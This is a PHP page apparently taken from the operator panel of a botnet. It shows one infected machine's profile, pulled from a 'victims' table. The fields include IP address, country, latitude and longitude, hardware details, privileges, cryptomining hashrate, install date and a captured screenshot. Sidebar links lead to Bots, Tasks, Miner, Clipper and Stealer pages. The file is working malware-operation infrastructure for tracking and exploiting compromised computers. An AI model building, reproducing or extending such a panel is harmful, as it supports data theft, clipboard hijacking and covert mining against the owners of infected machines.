<?php
session_start();

  if($_SESSION['logged']!="true")
  {
    header("Location: index.php");
    die();
  }

include_once '../includes/db.php';

if(isset($_GET['h']))
{
  $ex = true;
  $row = $pdo->prepare("SELECT count(*) FROM victims WHERE `hwid` = ?");
  $row->execute([$_GET['h']]);
  if($row->fetchColumn() == 0)
  {
    $ex = false;
  }else {
    $result  = $pdo->prepare("SELECT * FROM victims WHERE `hwid` = ? LIMIT 1");
    $result->execute([$_GET['h']]);
    $result->bindColumn('id',$id);
    $result->bindColumn('hwid',$hwid);
    $result->bindColumn('os',$os);
    $result->bindColumn('profile',$profile);
    $result->bindColumn('ip',$ip);
    $result->bindColumn('country',$country);
    $result->bindColumn('last_response',$lr);
    $result->bindColumn('install_date',$date);
    $result->bindColumn('latlng',$latlng);
    $result->bindColumn('cpu',$cpu);
    $result->bindColumn('gpu',$gpu);
    $result->bindColumn('aw',$aw);
    $result->bindColumn('privileges',$priv);
    $result->bindColumn('hashrate',$hash);
    $result->bindColumn('ram',$ram);
    $result->bindColumn('drives',$drives);

    $result->fetch();

  }
}else {
  header("Location: dashboard.php");
  die();
}

 ?><!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <!-- Favicon -->
    <link rel="shortcut icon" href="images/favicon.ico" />
    <!-- Font -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:200,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900">
    <!-- css -->
    <link rel="stylesheet" type="text/css" href="css/style.css" />
</head>

<body>
    <div class="wrapper">
        <!--=================================
 preloader -->
        <div id="pre-loader">
            <img src="images/pre-loader/loader-01.svg" alt="">
        </div>
        <!--=================================
 preloader -->
        <!--=================================
 header start-->

 <nav class="admin-header navbar navbar-default col-lg-12 col-12 p-0 fixed-top d-flex flex-row">
   <!-- logo -->
   <div class="text-left navbar-brand-wrapper">
     <a class="navbar-brand brand-logo" href="dashboard.php"><img src="images/logo-dark.png" alt="" ></a>
     <a class="navbar-brand brand-logo-mini" href="dashboard.php"><img src="images/logo-icon-dark.png" alt=""></a>
   </div>
   <!-- Top bar left -->
   <ul class="nav navbar-nav mr-auto">
     <li class="nav-item">
       <a id="button-toggle" class="button-toggle-nav inline-block ml-20 pull-left" href="javascript:void(0);"><i class="zmdi zmdi-menu ti-align-right"></i></a>
     </li>
     <li class="nav-item">
       <div class="search">
         <a class="search-btn not_click" href="javascript:void(0);"></a>
         <div class="search-box not-click">
           <input type="text" class="not-click form-control" placeholder="Under development" value="" name="search">
           <button class="search-button" type="submit"> <i class="fa fa-search not-click"></i></button>
         </div>
       </div>
     </li>
   </ul>
   <!-- top bar right -->
   <ul class="nav navbar-nav ml-auto">
     <li class="nav-item fullscreen">
       <a id="btnFullscreen" href="#" class="nav-link" ><i class="ti-fullscreen"></i></a>
     </li>
   </ul>
 </nav>

        <!--=================================
 Main content -->
 <div class="container-fluid">
     <div class="row">
         <!-- Left Sidebar start-->
         <div class="side-menu-fixed">
             <div class="scrollbar side-menu-bg">
                 <ul class="nav navbar-nav side-menu" id="sidebarnav">
                     <!-- menu item Dashboard-->
                     <li>
                         <a href="dashboard.php" >
                             <div class="pull-left"><i class="fa fa-dashboard"></i><span class="right-nav-text">Dashboard</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu title -->
                     <li class="mt-10 mb-10 text-muted pl-4 font-medium menu-title">Components </li>
                     <!-- menu item Elements-->
                     <li>
                         <a href="bots.php">
                             <div class="pull-left"><i class="fa fa-users"></i><span class="right-nav-text">Bots</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu item calendar-->
                     <li>
                         <a href="javascript:void(0);" data-toggle="collapse" data-target="#calendar-menu">
                             <div class="pull-left"><i class="fa  fa-code"></i><span class="right-nav-text">Command center</span></div>
                             <div class="pull-right"><i class="ti-plus"></i></div>
                             <div class="clearfix"></div>
                         </a>
                         <ul id="calendar-menu" class="collapse" data-parent="#sidebarnav">
                             <li> <a href="tasks.php">Tasks</a> </li>
                             <li> <a href="success.php">Success list</a> </li>
                         </ul>
                     </li>
                     <!-- menu item todo-->
                     <li>
                         <a href="miner.php"><i class="fa fa-btc"></i><span class="right-nav-text">Miner</span> </a>
                     </li>
                     <!-- menu item chat-->
                     <li>
                         <a href="clipper.php"><i class="fa fa-paste"></i><span class="right-nav-text">Clipper </span></a>
                     </li>
                     <!-- menu item Charts-->
                     <li>
                         <a href="stealer.php">
                             <div class="pull-left"><i class="fa fa-folder"></i><span class="right-nav-text">Stealer</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu item mailbox-->

                     <!-- menu font icon-->
                     <li>
                         <a href="settings.php">
                             <div class="pull-left"><i class="fa fa-cogs"></i><span class="right-nav-text">Settings</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu title -->

                     <!-- menu item Multi level-->

                 </ul>
             </div>
         </div>
         <!-- Left Sidebar End-->
         <!--=================================
 Main content -->
                <!--=================================
wrapper -->

                <div class="content-wrapper">
                    <div class="page-title">
                        <div class="row">
                            <div class="col-sm-6">
                                <h4 class="mb-5"> Profile </h4>
                            </div>
                            <div class="col-sm-6">
                            </div>
                        </div>
                    </div>
                    <!-- widgets -->
      <div class="row">
        <div class="col-xl-6 mb-30 mx-auto">
        <div class="card card-statistics h-100">
          <div class="card-body">
           <h5 class="card-title border-0 pb-0"></h5>
           <div class="table-responsive">
            <table class="mb-0 table table-bordered">
              <thead>
                <tr>
                  <th>Name</th>
                  <th>Value</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>Id</td>
                  <td><?php echo $id ?></td>
                </tr>
                <tr>
                  <td>Ip</td>
                  <td><?php echo $ip ?></td>
                </tr>
                <tr>
                  <td>Country</td>
                  <td><?php echo $country ?></td>
                </tr>
                <tr>
                  <td>LatLng</td>
                  <td><?php echo $latlng ?></td>
                </tr>
                <tr>
                  <td>OS</td>
                  <td><?php echo $os ?></td>
                </tr>
                <tr>
                  <td>CPU</td>
                  <td><?php echo $cpu ?></td>
                </tr>
                <tr>
                  <td>GPU</td>
                  <td><?php echo $gpu ?></td>
                </tr>
                <tr>
                  <td>RAM</td>
                  <td><?php echo $ram ?></td>
                </tr>
                <tr>
                  <td>Hard Drives</td>
                  <td><?php echo $drives ?></td>
                </tr>
                <tr>
                  <td>Aw</td>
                  <td><?php echo $aw ?></td>
                </tr>
                <tr>
                  <td>Privileges</td>
                  <td><?php echo $priv ?></td>
                </tr>
                <tr>
                  <td>Hashrate</td>
                  <td><?php echo $hash ?></td>
                </tr>
                <tr>
                  <td>Profile</td>
                  <td><?php echo $profile ?></td>
                </tr>
                <tr>
                  <td>Last response</td>
                  <td> <?php echo date("Y-m-d H:i", $lr) ?></td>
                </tr>
                <tr>
                  <td>Install date</td>
                  <td><?php echo   date("Y-m-d H:i", $date)?></td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        </div>

      </div>
      <div class="col-xl-6 mb-30 mx-auto" style=""><img src="../uploads/images/<?php echo $hwid ?>.jpeg" style="width: 100%;"></div>
      </div>

    <!--=================================
 footer -->

    <!--=================================
 jquery -->
    <!-- jquery -->
    <script src="js/jquery-3.3.1.min.js"></script>
    <!-- plugins-jquery -->
    <script src="js/plugins-jquery.js"></script>
    <!-- plugin_path -->
    <script>
    var plugin_path = 'js/';
    </script>
    <!-- jvectormap -->
    <script src="js/jvectormap/jquery-jvectormap-2.0.3.min.js"></script>
    <script src="js/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
    <script src="js/jvectormap/jquery-jvectormap-init.js"></script>
    <!-- chart -->
    <script src="js/chart-init.js"></script>
    <!-- calendar -->
    <script src="js/calendar.init.js"></script>
    <!-- charts sparkline -->
    <script src="js/sparkline.init.js"></script>
    <!-- charts morris -->
    <script src="js/morris.init.js"></script>
    <!-- datepicker -->
    <script src="js/datepicker.js"></script>
    <!-- sweetalert2 -->
    <script src="js/sweetalert2.js"></script>
    <!-- toastr -->
    <script src="js/toastr.js"></script>
    <!-- validation -->
    <script src="js/validation.js"></script>
    <!-- lobilist -->
    <script src="js/lobilist.js"></script>
    <!-- custom -->
    <script src="js/custom.js"></script>
</body>

</html>
